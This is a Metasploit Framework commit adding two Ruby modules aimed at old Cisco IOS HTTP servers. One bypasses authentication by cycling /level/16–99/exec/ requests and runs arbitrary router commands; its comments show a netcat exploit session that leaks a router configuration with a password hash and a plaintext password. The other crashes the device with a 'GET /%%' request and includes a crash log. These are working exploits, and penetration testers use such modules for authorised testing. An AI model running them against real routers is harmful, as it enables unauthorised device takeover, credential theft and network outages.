fb50691c126cae588055b9878d5f950abcfa6be3
HD Moore <hd_moore@rapid7.com>
2007-09-24 14:05:37 +0000

    New modules from Patrick Webster
    git-svn-id: file:///home/svn/framework3/trunk@5116 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/auxiliary/admin/cisco/ios_http_auth_bypass.rb
@@ -0,0 +1,140 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+
+require 'msf/core'
+
+module Msf
+
+class Auxiliary::Admin::Cisco::IOS_HTTP_Auth_Bypass < Msf::Auxiliary
+
+	include Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'Cisco IOS HTTP Unauthorized Administrative Access',
+			'Description'    => %q{
+				This module exploits a vulnerability in the Cisco IOS HTTP Server.
+				By sending a GET request for "/level/num/exec/..", where num is between
+				16 and 99, it is possible to bypass authentication and obtain full system
+				control. IOS 11.3 -> 12.2 are reportedly vulnerable. This module
+				tested successfully against a Cisco 1600 Router IOS v11.3(11d).
+			},
+			'Author'		=> [ 'Patrick Webster <patrick[at]aushack.com>' ],
+			'License'		=> MSF_LICENSE,
+			'Version'		=> '$Revision$',
+			'References'	=>
+				[
+					[ 'BID', '2936'],
+					[ 'CVE', '2001-0537'],
+					[ 'URL', 'http://www.cisco.com/warp/public/707/cisco-sa-20010627-ios-http-level.shtml'],
+					[ 'OSVDB', '578' ],
+				],
+			'DisclosureDate' => 'June 27 2001'))
+
+		register_options(
+			[
+				Opt::RPORT(80),
+				OptString.new('CMD', [ true, "Cisco IOS command", 'show start' ])
+			], self.class)
+						
+	end
+
+	def run
+		print_status("Looking for a vulnerable privilege level...")
+
+		16.upto(99) do | level |
+			connect
+
+			sploit = "GET /level/" + level.to_s + "/exec/show%20privilege HTTP/1.0\r\n\r\n"
+			sock.put(sploit)
+
+			result = sock.get(-1,-3)
+			disconnect
+
+			if (result =~ /Current privilege level is/)
+				print_status("Found vulnerable privilege level: " + level.to_s)
+				xCMD = Rex::Text.uri_encode(datastore['CMD'], 'hex-normal')
+				print_status("Sending your encoded command: " + xCMD)
+
+				connect
+
+				sploit = "GET /level/" + level.to_s + "/exec/" + xCMD + " HTTP/1.0\r\n\r\n"
+				sock.put(sploit)
+
+				result = sock.get(-1,-3)
+				print_status(result.to_s)
+
+				disconnect
+				break
+			end
+
+		end
+		
+	end
+
+end
+end	
+
+=begin
+
+Patrick Webster 20070922 Cisco 1600 Router IOS v11.3(11d).
+
+IOS info:
+	IOS (tm) 1600 Software (C1600-Y-L), Version 11.3(11d), RELEASE SOFTWARE (fc1)
+	Copyright (c) 1986-2003 by cisco Systems, Inc.
+	Compiled Tue 22-Jul-03 17:00 by eaarmas
+
+Example Exploit:
+
+	patrick@aushack ~
+	$ nc 172.16.32.2 80
+	GET /level/15/exec/show%20start HTTP/1.0
+
+	HTTP/1.0 401 Unauthorized
+	Date: Mon, 01 Mar 1993 00:20:41 UTC
+	Content-type: text/html
+	Expires: Thu, 16 Feb 1989 00:00:00 GMT
+	WWW-Authenticate: Basic realm="level 15 access"
+
+	<HEAD><TITLE>Authorization Required</TITLE></HEAD><BODY><H1>Authorization Requir
+	ed</H1>Browser not authentication-capable or authentication failed.</BODY>
+
+	patrick@aushack ~
+	$ nc 172.16.32.2 80
+	GET /level/16/exec/show%20start HTTP/1.0
+
+	HTTP/1.0 200 OK
+	Date: Mon, 01 Mar 1993 00:21:31 UTC
+	Server: cisco-IOS/11.3 HTTP-server/1.0(1)
+	Content-type: text/html
+	Expires: Thu, 16 Feb 1989 00:00:00 GMT
+
+
+	<HTML><HEAD><TITLE>Router /level/16/exec/show start</TITLE></HEAD>
+	<BODY><H1>Router</H1><PRE><HR>
+	<FORM METHOD=POST ACTION="/level/16/exec/show start"><DL>
+	Using 653 out of 7506 bytes
+	!
+	version 11.1
+	no service udp-small-servers
+	no service tcp-small-servers
+	!
+	hostname Router
+	!
+	boot system flash c1600-y-l.113-11d.bin
+	boot system flash
+	enable secret 5 $1$nDn5$pcheGox3RoCdQNjfq5BHe1
+	enable password cisco
+	!
+	[snip]
+
+=end
---
+++ modules/auxiliary/dos/cisco/ios_http_percentpercent.rb
@@ -0,0 +1,86 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+
+require 'msf/core'
+
+module Msf
+
+class Auxiliary::Dos::Cisco::IOS_HTTP_PercentPercent < Msf::Auxiliary
+
+	include Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'Cisco IOS HTTP GET /%% request Denial of Service',
+			'Description'    => %q{
+				This module triggers a Denial of Service condition in the Cisco IOS 
+				HTTP server. By sending a GET request for "/%%", the device becomes
+				unresponsive. IOS 11.1 -> 12.1 are reportedly vulnerable. This module
+				tested successfully against a Cisco 1600 Router IOS v11.2(18)P.
+			},
+			'Author' 		=> [ 'Patrick Webster <patrick[at]aushack.com>' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision$',
+			'References'     =>
+				[
+					[ 'BID', '1154'],
+					[ 'CVE', '2000-0380'],
+					[ 'URL', 'http://www.cisco.com/warp/public/707/cisco-sa-20000514-ios-http-server.shtml'],
+					[ 'OSVDB', '1302' ],
+				],
+			'DisclosureDate' => 'April 26 2000'))
+
+		register_options(
+			[
+				Opt::RPORT(80),
+			], self.class)
+						
+	end
+
+	def run
+		connect
+
+		print_status("Sending HTTP DoS packet")
+
+		sploit = "GET /%% HTTP/1.0"
+		sock.put(sploit + "\r\n")
+
+		disconnect
+	end
+
+end
+end	
+
+=begin
+
+Patrick Webster 20070915 Cisco 1600 Router IOS v11.2(18)P
+
+IOS info:
+	IOS (tm) 1600 Software (C1600-Y-L), Version 11.2(18)P,  RELEASE SOFTWARE (fc1)
+	Copyright (c) 1986-1999 by cisco Systems, Inc.
+	Compiled Mon 12-Apr-99 14:53 by ashah
+
+Example crash:
+
+	%Software-forced reload
+	Preparing to dump core...
+	Router>
+	*Mar  1 00:03:06.349: %SYS-2-WATCHDOG: Process aborted on watchdog timeout, Process = HTTP Server
+	-Traceback= 80EE1BC 80F0EC0 80EC004 81C0832 81C0B2E 81C0C76 81C0D68 81C0E4E
+	Queued messages:
+	*** EXCEPTION ***
+	software forced crash
+	program counter = 0x80eaca6
+	status register = 0x2700
+	vbr at time of exception = 0x4000000
+
+=end
